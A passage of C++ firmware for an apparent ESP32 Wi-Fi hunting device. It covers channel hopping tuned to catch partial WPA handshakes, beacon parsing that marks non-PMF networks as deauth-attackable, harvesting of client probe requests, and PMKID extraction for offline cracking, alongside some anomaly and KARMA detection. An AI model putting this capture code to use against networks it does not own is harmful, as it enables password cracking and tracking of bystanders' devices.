            if (bursts[b].huntChannelMatch) continue;
            uint8_t ch = bursts[b].dominantChannel;
            if (ch < 1 || ch > 13) continue;
            // contested channel: add pulls without reward (lowers UCB score)
            channelArms[ch].dPulls += (float)RECON_PRIOR_PULLS;
            totalDPulls += (float)RECON_PRIOR_PULLS;
        }
    }
}

static void hopToNextChannel() {
    // LURK: locked channel, no hopping
    if (currentBehavior == HuntBehavior::LURK) return;

    // D-UCB bandit selects next channel
    uint8_t selectedChannel = selectChannelDUCB();
    esp_err_t err = esp_wifi_set_channel(selectedChannel, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) {
        HAMLET_LOGF("[HUNT] channel set ch%d failed: 0x%x\n", selectedChannel, err);
    } else {
        currentChannel = selectedChannel;
        NowFlock::noteHuntChannel(currentChannel);
    }

    // Prime exposure tick on new channel so we don't sit at 0 pulls
    uint32_t tickMs = getTickMs();
    lastExposureTick = millis();
    if (lastExposureTick > tickMs) lastExposureTick -= tickMs;

    // refresh tree on new channel (CAMP only): show if clients, hide if none
    if (currentBehavior == HuntBehavior::CAMP && !Weather::isTreeSuppressed()) {
        uint8_t fruits = getTreeFruitCount();
        if (fruits > 0) {
            Avatar::showTree(fruits);
            treeVisible = true;
        } else if (treeVisible) {
            Avatar::hideTree();
            treeVisible = false;
        }
    }
}

static uint32_t getAdaptiveHopDelay() {
    // Activity-based dwell time - spend time where there's activity NOW
    // D-UCB rewards still used for channel SELECTION (which channel to visit)
    // Activity determines DWELL (how long to stay)
    
    uint32_t delay;
    
    // Base delay from config (behavior-specific)
    if (Config::getAdaptiveHunt()) {
        switch (currentBehavior) {
            case HuntBehavior::CAMP:    delay = HOP_DELAY_CAMP;  break;  // stationary: deep dwell
            case HuntBehavior::PATROL:  delay = HOP_DELAY_PATROL;   break;  // walking: faster hop
            case HuntBehavior::SPRINT:  delay = HOP_DELAY_SPRINT;   break;  // fastest hop
            case HuntBehavior::LURK:    return HOP_DELAY_LURK;  // locked channel: 5s between hops (effectively none)
        }
    } else {
        delay = HOP_DELAY_LEGACY;  // legacy non-adaptive fallback
    }
    
    // Behavior-specific network staleness timeout
    uint32_t activeTimeout;
    if (currentBehavior == HuntBehavior::CAMP || currentBehavior == HuntBehavior::LURK) {
        activeTimeout = ACTIVE_TIMEOUT_CAMP;
    } else if (currentBehavior == HuntBehavior::SPRINT) {
        activeTimeout = ACTIVE_TIMEOUT_SPRINT;
    } else {
        activeTimeout = ACTIVE_TIMEOUT_PATROL;
    }
    
    // Count active networks on THIS channel (live calculation, not cached stats)
    // Self-healing: old networks age out based on lastSeen timestamp
    // Phase 2: Track RSSI trends for motion-aware dwell
    // Use MAX approaching trend (not average) - one good target justifies extended dwell
    uint16_t activeOnChannel = 0;
    int8_t maxApproachTrend = 0;   // best approaching network (positive = good)
    int8_t minRetreatTrend = 0;    // worst retreating network (negative = bad)
    uint32_t now = millis();
    for (uint16_t i = 0; i < networkCount; i++) {
        if (networks[i].channel == currentChannel &&
            now - networks[i].lastSeen < activeTimeout) {
            activeOnChannel++;
            // Only count trend if we have enough samples (beaconCount > 4)
            if (networks[i].beaconCount > 4) {
                if (networks[i].rssiTrend > maxApproachTrend) {
                    maxApproachTrend = networks[i].rssiTrend;
                }
                if (networks[i].rssiTrend < minRetreatTrend) {
                    minRetreatTrend = networks[i].rssiTrend;
                }
            }
        }
    }
    
    // Scale delay based on CURRENT channel activity (not historical rewards)
    if (activeOnChannel == 0) {
        // Dead channel - fast hop (null-dwell principle)
        return delay;  // 80-150ms
    } else if (activeOnChannel <= 2) {
        // Low activity - 500ms dwell (beacon + handshake window)
        delay = max(delay, HOP_DWELL_LOW);
    } else {
        // High activity - 1-2s dwell based on network count
        // 3 networks = 1s, 10+ networks = 2s
        uint32_t activityDelay = HOP_DWELL_HIGH_BASE + min((uint32_t)activeOnChannel * 100, HOP_DWELL_HIGH_MAX_ADD);
        delay = max(delay, activityDelay);
    }
    
    // === PHASE 2: Motion-aware dwell modifier ===
    // Use max approach trend (one good target = extend dwell)
    // Use min retreat trend only if NO approaching targets (all fading = hop faster)
    if (currentBehavior == HuntBehavior::PATROL || currentBehavior == HuntBehavior::SPRINT) {
        // Moving modes: prioritize approaching, penalize only if all retreating
        if (maxApproachTrend > DWELL_APPROACH_FAST_THRESH) {
            delay = (delay * 120) / 100;
        } else if (maxApproachTrend <= 0 && minRetreatTrend < DWELL_RETREAT_FAST_THRESH) {
            delay = (delay * 70) / 100;
        }
        // SPRINT: cap max dwell to keep hopping fast
        if (currentBehavior == HuntBehavior::SPRINT && delay > HOP_SPRINT_MAX_DWELL) {
            delay = HOP_SPRINT_MAX_DWELL;
        }
    } else if (currentBehavior == HuntBehavior::CAMP) {
        // CAMP mode: reward approaching signals
        if (maxApproachTrend > DWELL_APPROACH_CAMP_THRESH) {
            delay = (delay * 130) / 100;
        }
    }
    // LURK: already returned 5000ms above
    
    // Extra dwell if pending handshake on THIS channel (not any channel)
    // captureChannel is set once at first EAPOL (line 3121), same field used for D-UCB attribution
    for (uint8_t i = 0; i < MAX_PENDING_HANDSHAKES; i++) {
        if (pendingHandshakes[i].active &&
            pendingHandshakes[i].capturedMask > 0 &&
            pendingHandshakes[i].capturedMask < 0x0F &&
            pendingHandshakes[i].captureChannel == currentChannel) {
            // Have partial handshake on THIS channel - dwell +1s to catch rest
            delay += HOP_PARTIAL_HS_EXTRA;
            break;
        }
    }
    
    return delay;
}

static DetectedNetwork* findOrCreateNetwork(const uint8_t* bssid) {
    if (!networks) return nullptr;
    // O(1) hash lookup instead of O(n) linear scan
    uint16_t found = hashFindNetwork(bssid);
    if (found != HUNT_HASH_EMPTY) {
        return &networks[found];
    }

    // Create new
    DetectedNetwork* net = nullptr;
    uint16_t slotIdx;

    if (networkCount >= MAX_HUNT_NETWORKS) {
        // Find oldest to replace (LRU eviction)
        uint32_t oldest = UINT32_MAX;
        uint16_t oldestIdx = 0;
        for (uint16_t i = 0; i < networkCount; i++) {
            if (networks[i].lastSeen < oldest) {
                oldest = networks[i].lastSeen;
                oldestIdx = i;
            }
        }
        // Defer PSRAM free to update() (heap_caps_free unsafe in callback)
        if (networks[oldestIdx].beaconFrame) {
            queueBeaconFree(networks[oldestIdx].beaconFrame);
            networks[oldestIdx].beaconFrame = nullptr;
            networks[oldestIdx].beaconLen = 0;
        }
        memset(&networks[oldestIdx], 0, sizeof(DetectedNetwork));
        net = &networks[oldestIdx];
        slotIdx = oldestIdx;
        // rebuild hash after eviction (slot reuse invalidates old entry)
        hashRebuildNetworks();
    } else {
        memset(&networks[networkCount], 0, sizeof(DetectedNetwork));
        slotIdx = networkCount;
        net = &networks[networkCount++];
    }

    // Set BSSID immediately to prevent duplicate entries
    memcpy(net->bssid, bssid, 6);
    hashInsertNetwork(bssid, slotIdx);

    return net;
}

static uint32_t fnv1aInit() {
    return 2166136261u;
}

static uint32_t fnv1aUpdate(uint32_t hash, const void* data, uint16_t len) {
    const uint8_t* p = (const uint8_t*)data;
    for (uint16_t i = 0; i < len; i++) {
        hash = (hash ^ p[i]) * 16777619u;
    }
    return hash;
}

// ==[ IE SUB-HASHES ]== per-category fingerprint output (SNAPPY-style detail)
struct IESubHashes {
    uint32_t rates;    // Supported+Extended Rates
    uint32_t rsn;      // RSN IE (cipher/AKM)
    uint32_t vendor;   // all Vendor Specific IEs
    uint32_t caps;     // HT Capabilities + Capabilities field
};

static uint32_t computeBeaconFingerprint(const uint8_t* payload, uint16_t len,
                                         bool* wellFormed, IESubHashes* subOut = nullptr) {
    if (wellFormed) *wellFormed = false;
    if (!payload || len < 36) return 0;

    uint16_t pos = 36;
    const uint8_t* supportedRates = nullptr;
    uint8_t supportedRatesLen = 0;
    const uint8_t* extendedRates = nullptr;
    uint8_t extendedRatesLen = 0;
    const uint8_t* country = nullptr;
    uint8_t countryLen = 0;
    const uint8_t* htCaps = nullptr;
    uint8_t htCapsLen = 0;
    const uint8_t* rsn = nullptr;
    uint8_t rsnLen = 0;
    uint32_t vendorHash = fnv1aInit();
    uint8_t vendorCount = 0;

    while (pos + 2 <= len) {
        uint8_t ieType = payload[pos];
        uint8_t ieLen = payload[pos + 1];
        if (pos + 2 + ieLen > len) {
            return 0;
        }

        const uint8_t* ieBody = payload + pos + 2;
        switch (ieType) {
            case 0x01:
                supportedRates = ieBody;
                supportedRatesLen = ieLen;
                break;
            case 0x07:
                country = ieBody;
                countryLen = ieLen;
                break;
            case 0x2D:
                htCaps = ieBody;
                htCapsLen = ieLen;
                break;
            case 0x30:
                rsn = ieBody;
                rsnLen = ieLen;
                break;
            case 0x32:
                extendedRates = ieBody;
                extendedRatesLen = ieLen;
                break;
            case 0xDD:
                vendorHash = fnv1aUpdate(vendorHash, &ieType, 1);
                vendorHash = fnv1aUpdate(vendorHash, &ieLen, 1);
                vendorHash = fnv1aUpdate(vendorHash, ieBody, ieLen);
                if (vendorCount < 0xFF) vendorCount++;
                break;
            default:
                break;
        }

        pos += 2 + ieLen;
    }

    uint32_t hash = fnv1aInit();
    const uint8_t capabilities[2] = { payload[34], payload[35] };
    hash = fnv1aUpdate(hash, capabilities, sizeof(capabilities));

    struct FingerprintChunk {
        uint8_t type;
        const uint8_t* body;
        uint8_t len;
    };

    const FingerprintChunk chunks[] = {
        {0x01, supportedRates, supportedRatesLen},
        {0x32, extendedRates, extendedRatesLen},
        {0x07, country, countryLen},
        {0x2D, htCaps, htCapsLen},
        {0x30, rsn, rsnLen},
    };

    for (const FingerprintChunk& chunk : chunks) {
        if (!chunk.body) continue;
        hash = fnv1aUpdate(hash, &chunk.type, 1);
        hash = fnv1aUpdate(hash, &chunk.len, 1);
        hash = fnv1aUpdate(hash, chunk.body, chunk.len);
    }

    if (vendorCount > 0) {
        const uint8_t vendorTag = 0xDD;
        hash = fnv1aUpdate(hash, &vendorTag, 1);
        hash = fnv1aUpdate(hash, &vendorCount, 1);
        hash = fnv1aUpdate(hash, &vendorHash, sizeof(vendorHash));
    }

    // ==[ IE SUB-HASHES ]== per-category detail for "what changed?" forensics
    if (subOut) {
        // Rates: Supported + Extended
        uint32_t rh = fnv1aInit();
        if (supportedRates) rh = fnv1aUpdate(rh, supportedRates, supportedRatesLen);
        if (extendedRates) rh = fnv1aUpdate(rh, extendedRates, extendedRatesLen);
        subOut->rates = rh;

        // RSN: cipher suites + AKM
        subOut->rsn = rsn ? fnv1aUpdate(fnv1aInit(), rsn, rsnLen) : 0;

        // Vendor: already computed incrementally
        subOut->vendor = (vendorCount > 0) ? vendorHash : 0;

        // Caps: HT Capabilities + fixed Capabilities field
        uint32_t ch = fnv1aInit();
        ch = fnv1aUpdate(ch, capabilities, 2);
        if (htCaps) ch = fnv1aUpdate(ch, htCaps, htCapsLen);
        subOut->caps = ch;
    }

    if (wellFormed) *wellFormed = true;
    return hash;
}

static void handleBeacon(const uint8_t* payload, uint16_t len, int8_t rssi, uint8_t rxChannel) {
    if (len < 36) return;

    const uint8_t* bssid = payload + 16;
    
    // Skip our own AP beacons (APSTA mode broadcasts hidden beacon)
    if (ourApMacValid && memcmp(bssid, ourApMac, 6) == 0) return;
    
    uint32_t now = millis();
    
    // Track last beacon seen for dead air detection
    lastNetworkSeen = now;
    
    DetectedNetwork* net = findOrCreateNetwork(bssid);
    if (!net) return;
    uint32_t prevSeen = net->lastSeen;
    bool isNewNetwork = (net->beaconCount == 0);

    // BSSID novelty tracking for location-change detection (callback-safe: simple increment)
    noveltyTotal++;
    if (isNewNetwork) {
        noveltyNovel++;
        burstNewCount++;  // OPT-6: burst detection (4+ new in 5s = immediate alpha reset)
    }

    // Update always
    memcpy(net->bssid, bssid, 6);
    net->rssi = rssi;
    net->lastSeen = now;
    // beaconCount is uint16 — at 10 beacons/sec/AP the counter wraps after
    // ~109 minutes, which would re-trigger "new network" (beaconCount==0 check
    // at line 2592) and re-fire mood/avatar events. cap instead of wrapping.
    if (net->beaconCount < 0xFFFF) net->beaconCount++;
    net->channel = rxChannel;

    // M2: beacon sequence-number discontinuity.
    if (net->seqAnomalyCount > 0 &&
        net->lastSeqAnomaly > 0 &&
        now - net->lastSeqAnomaly > SEQ_ANOMALY_WINDOW_MS) {
        net->seqAnomalyCount = 0;
    }
    uint16_t seqControl = payload[22] | (payload[23] << 8);
    uint16_t seqNum = (seqControl >> 4) & 0x0FFF;
    // cold-start protection: first beacon may be stale echo, second may be one
    // large real delta — require 3+ beacons so we have at least two stable
    // deltas before trusting the baseline for anomaly flagging
    if (net->beaconCount > 3) {
        uint16_t delta = (seqNum - net->lastSeqNum) & 0x0FFF;
        if (delta != 0 && delta > SEQ_DELTA_ANOMALY) {
            if (net->lastSeqAnomaly == 0 ||
                now - net->lastSeqAnomaly > SEQ_ANOMALY_WINDOW_MS) {
                net->seqAnomalyCount = 1;
            } else if (net->seqAnomalyCount < 0xFF) {
                net->seqAnomalyCount++;
            }
            if (net->seqAnomalyCount > 3) net->seqAnomalyCount = 3;
            net->lastSeqAnomaly = now;
        }
    }
    net->lastSeqNum = seqNum;

    // M3: stationary RSSI jump using the existing 4-sample ring as baseline.
    if (!motionStationary) {
        net->rssiAnomalyCount = 0;
    } else {
        if (net->rssiAnomalyCount > 0 &&
            net->lastRssiAnomaly > 0 &&
            now - net->lastRssiAnomaly > RSSI_ANOMALY_WINDOW_MS) {
            net->rssiAnomalyCount = 0;
        }
        if (net->rssiHistoryCount >= 4) {
            int16_t sum = 0;
            for (uint8_t i = 0; i < 4; i++) sum += net->rssiHistory[i];
            int8_t avg = (int8_t)(sum / 4);
            if (abs((int)rssi - (int)avg) >= RSSI_ANOMALY_JUMP_THRESH) {
                if (net->lastRssiAnomaly == 0 ||
                    now - net->lastRssiAnomaly > RSSI_ANOMALY_WINDOW_MS) {
                    net->rssiAnomalyCount = 1;
                } else if (net->rssiAnomalyCount < 0xFF) {
                    net->rssiAnomalyCount++;
                }
                if (net->rssiAnomalyCount > 2) net->rssiAnomalyCount = 2;
                net->lastRssiAnomaly = now;
            }
        }
    }

    // RSSI trend tracking (sample every 500ms for motion-aware hunting)
    if (now - net->rssiLastSample >= 500) {
        // Store in ring buffer
        net->rssiHistory[net->rssiIdx] = rssi;
        net->rssiIdx = (net->rssiIdx + 1) & 0x03;  // wrap 0-3
        if (net->rssiHistoryCount < 4) net->rssiHistoryCount++;
        net->rssiLastSample = now;
        
        // Compute trend: newest - oldest (positive = approaching)
        uint8_t newestIdx = (net->rssiIdx + 3) & 0x03;  // just wrote here
        uint8_t oldestIdx = net->rssiIdx;               // about to overwrite next
        net->rssiTrend = net->rssiHistory[newestIdx] - net->rssiHistory[oldestIdx];
    }
    
    // Capture first beacon frame for PCAP export - stage to static buffer
    // PSRAM alloc deferred to update() (heap_caps_malloc unsafe in callback)
    if (net->beaconLen == 0 && len <= BEACON_MAX_STAGE_LEN && !pendingBeacon.ready && pendingBeacon.data) {
        memcpy(pendingBeacon.data, payload, len);
        pendingBeacon.len = len;
        memcpy(pendingBeacon.bssid, bssid, 6);
        pendingBeacon.ready = true;
    }
    
    // Update channel stats (guard against invalid channel)
    if (rxChannel == 0 || rxChannel > 13) return;
    channelStats[rxChannel].beaconCount++;
    channelStats[rxChannel].lastBeacon = now;
    if (isNewNetwork) {
        channelStats[rxChannel].networkCount++;
    }
    
    // Parse IEs
    uint16_t pos = 36;  // Fixed params + SSID IE start
    bool ieMalformed = false;
    
    while (pos + 2 <= len) {
        uint8_t ieType = payload[pos];
        uint8_t ieLen = payload[pos + 1];
        
        if (pos + 2 + ieLen > len) {
            ieMalformed = true;
            break;
        }
        
        switch (ieType) {
            case 0x00:  // SSID
                if (ieLen > 0 && ieLen <= 32) {
                    memcpy(net->ssid, payload + pos + 2, ieLen);
                    net->ssid[ieLen] = '\0';
                    
                    // Check if SSID is all nulls (alternative "hidden" method)
                    // Some APs broadcast ieLen > 0 but fill with \0 to hide
                    bool allNulls = true;
                    for (uint8_t j = 0; j < ieLen; j++) {
                        if (net->ssid[j] != '\0') {
                            allNulls = false;
                            break;
                        }
                    }
                    
                    // Fix: don't reset isHidden if already revealed
                    if (!net->wasRevealed) {
                        net->isHidden = allNulls;
                    }
                } else if (ieLen == 0) {
                    // Fix: don't reset isHidden if already revealed
                    if (!net->wasRevealed) {
                        net->isHidden = true;
                    }
                }
                break;
                
            case 0x30: {  // RSN IE
                // Parse AKM suites + PMF from RSN Information Element
                // RSN IE body: Version(2) + GroupCipher(4) + PairwiseCount(2) + PairwiseSuites(4*N)
                //              + AKMCount(2) + AKMSuites(4*N) + RSNCaps(2)
                const uint8_t* rsn = payload + pos + 2;
                uint16_t rsnLen = ieLen;

                if (rsnLen < 8) break;  // need at least version + group cipher + pairwise count

                // Skip version (2) + group cipher (4)
                uint32_t off = 6;

                // Pairwise cipher count + suites
                if (off + 2 > rsnLen) break;
                uint16_t pairCount = rsn[off] | (rsn[off + 1] << 8);
                if (pairCount > 8) break;  // sanity cap (real APs use 1-2)
                uint32_t pairSkip = 2u + (uint32_t)pairCount * 4u;
                if (off + pairSkip > rsnLen) break;
                off += pairSkip;

                // AKM suite count + suites
                if (off + 2 > rsnLen) break;
                uint16_t akmCount = rsn[off] | (rsn[off + 1] << 8);
                if (akmCount > 8) break;  // sanity cap (real APs use 1-2)
                off += 2;

                bool hasPSK = false;
                bool hasSAE = false;

                for (uint16_t a = 0; a < akmCount && off + 4 <= rsnLen; a++) {
                    // OUI 00:0F:AC + type
                    if (rsn[off] == 0x00 && rsn[off+1] == 0x0F && rsn[off+2] == 0xAC) {
                        uint8_t akmType = rsn[off + 3];
                        if (akmType == 0x02) hasPSK = true;        // PSK (WPA2)
                        else if (akmType == 0x06) hasSAE = true;   // SAE (WPA3)
                        else if (akmType == 0x08) hasSAE = true;   // SAE-FT (WPA3)
                    }
                    off += 4;
                }

                // Determine auth mode from AKM suites
                if (hasPSK && hasSAE)       net->authmode = WIFI_AUTH_WPA2_WPA3_PSK;
                else if (hasSAE)            net->authmode = WIFI_AUTH_WPA3_PSK;
                else if (hasPSK)            net->authmode = WIFI_AUTH_WPA2_PSK;
                else                        net->authmode = WIFI_AUTH_WPA2_PSK;  // fallback

                // RSN Capabilities (2 bytes after AKM suites)
                if (off + 2 <= rsnLen) {
                    uint16_t caps = rsn[off] | (rsn[off + 1] << 8);
                    // MFPR (bit 7) = PMF required — truly immune to deauth
                    // MFPC (bit 6) = PMF capable but optional — deauth still works on WPA2 clients
                    net->hasPMF = (caps & 0x0080) != 0;  // MFPR only
                }
            }
                break;

            case 0xDD: {  // Vendor Specific IE
                if (ieLen >= 4) {
                    const uint8_t* oui = payload + pos + 2;
                    // ==[ WPS IE ]== OUI 00:50:F2, type 04
                    if (oui[0] == 0x00 && oui[1] == 0x50 && oui[2] == 0xF2 && oui[3] == 0x04) {
                        uint16_t wpsPos = 4;
                        while (wpsPos + 4 <= ieLen) {
                            uint16_t attrType = ((uint16_t)payload[pos + 2 + wpsPos] << 8) | payload[pos + 2 + wpsPos + 1];
                            uint16_t attrLen = ((uint16_t)payload[pos + 2 + wpsPos + 2] << 8) | payload[pos + 2 + wpsPos + 3];
                            if (wpsPos + 4 + attrLen > ieLen) break;
                            if (attrType == 0x1044 && attrLen >= 1) {
                                net->wpsState = payload[pos + 2 + wpsPos + 4];
                            }
                            if (attrType == 0x1049 && attrLen >= 1) {
                                net->wpsLocked = (payload[pos + 2 + wpsPos + 4] == 0x01);
                            }
                            wpsPos += 4 + attrLen;
                        }
                    }
                    // first vendor OUI for router manufacturer identification
                    if (!net->hasVendorOUI && ieLen >= 3) {
                        memcpy(net->vendorOUI, oui, 3);
                        net->hasVendorOUI = true;
                    }
                }
                break;
            }
        }

        pos += 2 + ieLen;
    }

    // M1: canonical beacon fingerprint over capabilities + selected IEs.
    if (!ieMalformed) {
        bool fingerprintWellFormed = false;
        IESubHashes subHashes = {};
        uint32_t fingerprint = computeBeaconFingerprint(payload, len, &fingerprintWellFormed, &subHashes);
        if (fingerprintWellFormed) {
            if (!net->fingerprintSet) {
                net->beaconFingerprint = fingerprint;
                net->ieHashRates = subHashes.rates;
                net->ieHashRSN = subHashes.rsn;
                net->ieHashVendor = subHashes.vendor;
                net->ieHashCaps = subHashes.caps;
                net->fingerprintSet = true;
                net->fingerprintMismatchStreak = 0;
            } else if (fingerprint != net->beaconFingerprint) {
                // record WHICH IE categories changed (for terminal detail)
                uint8_t changeMask = 0;
                if (subHashes.rates  != net->ieHashRates)  changeMask |= 0x01;
                if (subHashes.rsn    != net->ieHashRSN)    changeMask |= 0x02;
                if (subHashes.vendor != net->ieHashVendor) changeMask |= 0x04;
                if (subHashes.caps   != net->ieHashCaps)   changeMask |= 0x08;
                net->ieChangeMask = changeMask;

                if (prevSeen == 0 || (now - prevSeen > FINGERPRINT_STREAK_WINDOW_MS)) {
                    net->fingerprintMismatchStreak = 1;
                } else if (net->fingerprintMismatchStreak < 2) {
                    net->fingerprintMismatchStreak++;
                }
                if (net->fingerprintMismatchStreak >= 2 &&
                    (net->lastFingerprintAnomaly == 0 ||
                     now - net->lastFingerprintAnomaly >= FINGERPRINT_EVENT_COOLDOWN_MS)) {
                    net->lastFingerprintAnomaly = now;
                }
            } else {
                net->fingerprintMismatchStreak = 0;
            }
        }
    }

    // Track attackable networks (non-PMF) for D-UCB activity bonus
    // This happens AFTER parsing so we know PMF status
    // PMF is the main blocker for deauth - networks with PMF can't be attacked
    if (isNewNetwork && !net->hasPMF) {
        channelStats[rxChannel].attackableCount++;
    }
    
    // New network detection — defer Mood/Avatar to update() (not callback-safe)
    if (isNewNetwork && strlen(net->ssid) > 0) {
        pendingNewNetwork = true;

        // Occasionally show SSID (1-in-5 chance, decided here to keep randomness)
        if ((esp_random() % SSID_SHOW_CHANCE) == 0) {
            char tmpSSID[16];
            snprintf(tmpSSID, sizeof(tmpSSID), "%.12s...", net->ssid);
            // Lock, memcpy, unlock — protects against concurrent reads and overwrites
            portENTER_CRITICAL(&pendingSSIDMux);
            memcpy((void*)pendingSSIDBuf, tmpSSID, sizeof(pendingSSIDBuf));
            portEXIT_CRITICAL(&pendingSSIDMux);
            // Set flag with release semantics to ensure buffer writes are visible to reader
            pendingNewNetworkSSID.store(true, std::memory_order_release);
        }
    }
}

// ==[ PROBE HARVEST ]== passive client probe request collection
// clients broadcast probe requests containing SSIDs they've previously connected to.
// all ops callback-safe: memcpy, memcmp, array indexing. no heap, no I2C, no NVS.
static void handleProbeRequest(const uint8_t* payload, uint16_t len, int8_t rssi) {
    if (len < 36) return;

    const uint8_t* clientMac = payload + 10;  // SA (source address, Addr2)

    // skip broadcast/multicast
    if (clientMac[0] & 0x01) return;

    bool isRandomizedMac = (clientMac[0] & 0x02) != 0;
    totalProbeRequests++;  // count ALL probes (including randomized MAC) for forensic totals
    if (!harvestedProbes) return;
    // randomized MACs: identity useless, skip harvest table
    if (isRandomizedMac) {
        return;
    }

    // parse SSID IE from probe request body
    uint16_t pos = 24;  // after 802.11 management header
    while (pos + 2 <= len) {
        uint8_t ieType = payload[pos];
        uint8_t ieLen = payload[pos + 1];
        if (pos + 2 + ieLen > len) break;

        if (ieType == 0x00 && ieLen > 0 && ieLen <= 32) {
            // directed probe with SSID — this is the intel we want
            const char* probedSSID = (const char*)(payload + pos + 2);

            // deduplicate: same client + same SSID = update only
            for (uint16_t i = 0; i < harvestedCount; i++) {
                if (memcmp(harvestedProbes[i].clientMac, clientMac, 6) == 0 &&
                    (uint8_t)strlen(harvestedProbes[i].ssid) == ieLen &&
                    memcmp(harvestedProbes[i].ssid, probedSSID, ieLen) == 0) {
                    harvestedProbes[i].lastSeen = millis();
                    harvestedProbes[i].rssi = rssi;
                    return;  // already known
                }
            }

            // find slot: append or LRU evict
            uint16_t slot;
            if (harvestedCount < MAX_HARVESTED_PROBES) {
                slot = harvestedCount++;
            } else {
                // LRU: evict oldest
                uint32_t oldest = UINT32_MAX;
                slot = 0;
                for (uint16_t i = 0; i < MAX_HARVESTED_PROBES; i++) {
                    if (harvestedProbes[i].lastSeen < oldest) {
                        oldest = harvestedProbes[i].lastSeen;
                        slot = i;
                    }
                }
            }

            memcpy(harvestedProbes[slot].clientMac, clientMac, 6);
            memcpy(harvestedProbes[slot].ssid, probedSSID, ieLen);
            harvestedProbes[slot].ssid[ieLen] = '\0';
            harvestedProbes[slot].rssi = rssi;
            harvestedProbes[slot].lastSeen = millis();
            return;
        }
        pos += 2 + ieLen;
    }
}

static void handleProbeResponse(const uint8_t* payload, uint16_t len, int8_t rssi) {
    // Probe responses are used only to lift the veil from hidden SSIDs. Beacon
    // samples remain the signal/trend ledger, so this callback must not splice
    // a one-off response RSSI into that time series.
    (void)rssi;
    if (len < 36) return;
    
    const uint8_t* bssid = payload + 16;
    DetectedNetwork* net = findOrCreateNetwork(bssid);
    if (!net) return;

    // Parse SSID from probe response
    uint16_t pos = 36;
    while (pos + 2 <= len) {
        uint8_t ieType = payload[pos];
        uint8_t ieLen = payload[pos + 1];
        
        if (pos + 2 + ieLen > len) break;
        
        if (ieType == 0x00) {  // SSID IE found
            if (ieLen > 0 && ieLen <= 32) {
                // Valid SSID - copy it
                memcpy(net->ssid, payload + pos + 2, ieLen);
                net->ssid[ieLen] = '\0';
                
                // Check if all nulls (alternative hidden method)
                bool allNulls = true;
                for (uint8_t j = 0; j < ieLen; j++) {
                    if (net->ssid[j] != '\0') {
                        allNulls = false;
                        break;
                    }
                }
                
                if (allNulls) {
                    net->isHidden = true;
                } else if (net->isHidden) {
                    // Was hidden, now revealed
                    net->wasRevealed = true;
                    net->isHidden = false;
                }
                // ==[ KARMA TRACKING ]== record BSSID+SSID pair for probe-response KARMA detection
                // callback-safe: static ring buffer, no alloc
                if (!allNulls) {
                    KarmaProbeEntry& slot = karmaRing[karmaRingHead];
                    memcpy(slot.bssid, bssid, 6);
                    memcpy(slot.ssid, payload + pos + 2, ieLen);
                    slot.ssid[ieLen] = '\0';
                    karmaRingHead = (karmaRingHead + 1) % KARMA_RING_SIZE;
                    if (karmaRingCount < KARMA_RING_SIZE) karmaRingCount++;
                    pendingKarmaCheck = true;
                }
            } else if (ieLen == 0) {
                // Explicitly hidden (ieLen == 0)
                net->isHidden = true;
            }
            // ieLen > 32 = malformed, ignore
            break;
        }

        pos += 2 + ieLen;
    }
}

static void handleAssocResponse(const uint8_t* payload, uint16_t len, int8_t rssi) {
    // Only care if we're waiting for probe response
    if (probeState != ProbeState::WAITING) return;
    // Snapshot probeTarget — main thread can null/reassign it between the check
    // and the dereference. We run on Core 0 and the pointer is non-atomic.
    DetectedNetwork* target = probeTarget;
    if (target == nullptr) return;

    const uint8_t* bssid = payload + 16;

    // Verify this is from our target
    if (memcmp(bssid, target->bssid, 6) != 0) return;

    // Mark that we got a response (for probe success feedback)
    target->gotResponse = true;
    
    // Parse for PMKID in RSN IE
    uint16_t pos = 30;  // Skip fixed params
    
    while (pos + 2 <= len) {
        uint8_t ieType = payload[pos];
        uint8_t ieLen = payload[pos + 1];
        
        if (pos + 2 + ieLen > len) break;
        
        if (ieType == 0x30 && ieLen >= 22) {  // RSN IE
            // Parse RSN to find PMKID list
            const uint8_t* rsn = payload + pos;
            
            // Skip: ID(1) + Len(1) + Version(2) + GroupCipher(4)
            uint16_t rsnPos = 8;
            
            // Pairwise count - with bounds check against malicious APs
            if (rsnPos + 2 > ieLen + 2) break;
            uint16_t pairCount = rsn[rsnPos] | (rsn[rsnPos + 1] << 8);
            if (pairCount > 8) break;  // Sanity: max 8 pairwise ciphers (real APs use 1-2)
            rsnPos += 2 + (4 * pairCount);
            
            // AKM count - with bounds check
            if (rsnPos + 2 > ieLen + 2) break;
            uint16_t akmCount = rsn[rsnPos] | (rsn[rsnPos + 1] << 8);
            if (akmCount > 8) break;  // Sanity: max 8 AKM suites (real APs use 1-2)
            rsnPos += 2 + (4 * akmCount);
            
            // RSN capabilities
            if (rsnPos + 2 > ieLen + 2) break;
            rsnPos += 2;
            
            // PMKID count
            if (rsnPos + 2 > ieLen + 2) break;
            uint16_t pmkidCount = rsn[rsnPos] | (rsn[rsnPos + 1] << 8);
            rsnPos += 2;
            
            if (pmkidCount > 0 && rsnPos + 16 <= ieLen + 2) {
                // GOT PMKID! Stage for deferred processing in update()
                // memcpy + static flags = callback-safe; PSRAM/NVS/I2C/SFX deferred
                if (!pendingPMKID.ready) {
                    memcpy(pendingPMKID.bssid, target->bssid, 6);
                    memcpy(pendingPMKID.station, ourStaMac, 6);
                    memcpy(pendingPMKID.pmkidBytes, rsn + rsnPos, 16);
                    pendingPMKID.isFirstCapture = (sessionPMKIDs == 0 && sessionHandshakes == 0);
                    // defer lifetime count to update() — Config reads not callback-safe
                    pendingPMKID.totalLifetime = 0;  // filled in update()

                    sessionPMKIDs++;
                    target->hasPMKID = true;
                    pmkidExtracted = true;
                    channelStats[currentChannel].pmkidHits++;
                    pendingPMKIDBeep = true;

                    pendingPMKID.ready = true;
                }
            }
            break;
        }
        
        pos += 2 + ieLen;
    }
}

// Track clients from data frames (ToDS/FromDS)
// This enables proper channel dwell when activity is detected
static void trackClientFromData(const uint8_t* payload, uint16_t len, int8_t rssi) {
    if (len < 24) return;
    
    // Parse ToDS/FromDS flags
    uint8_t toDs = (payload[1] & 0x01);
    uint8_t fromDs = (payload[1] & 0x02) >> 1;
    
    // Determine client and AP MACs based on direction
    const uint8_t* clientMac = nullptr;
    const uint8_t* apBssid = nullptr;
    
    if (toDs && !fromDs) {
        // Station to AP: Addr1=BSSID, Addr2=SA(client)
        apBssid = payload + 4;
        clientMac = payload + 10;
    } else if (!toDs && fromDs) {
        // AP to Station: Addr1=DA(client), Addr2=BSSID
        clientMac = payload + 4;
        apBssid = payload + 10;
    } else {
        // WDS or IBSS - skip
        return;
    }
    
    // Skip broadcast/multicast clients
